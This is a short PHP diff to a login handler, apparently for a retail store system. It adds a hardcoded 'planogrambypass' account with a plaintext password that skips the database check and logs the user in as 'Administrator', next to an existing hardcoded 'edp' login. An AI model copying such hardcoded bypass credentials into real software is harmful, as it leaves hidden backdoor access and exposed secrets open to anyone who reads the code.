@@ -36,7 +36,17 @@ if ($username === 'edp' && $_POST['pwd'] === 'edpidolmart2026') {
 	exit();
 }
 
+if ($username === 'planogrambypass' && $_POST['pwd'] === 'planogramidolmart2026bypass') {
+	$_SESSION['userid'] = 'Planogram By Pass';
+	$_SESSION['username'] = 'planogrambypass';
+	$_SESSION['org_key'] = $org_key; // Ganti dengan org_key yang sesuai
+	$_SESSION['name'] = 'Administrator';
+	$_SESSION['role'] = 'planogram';
+	$_SESSION['kode_toko'] = $kode_toko; // Ganti dengan kode_toko yang sesuai
 
+	header("Location: ../content.php?edp");
+	exit();
+}
 
 if($rows > 0){
 	foreach ($connec->query($sql) as $row) {
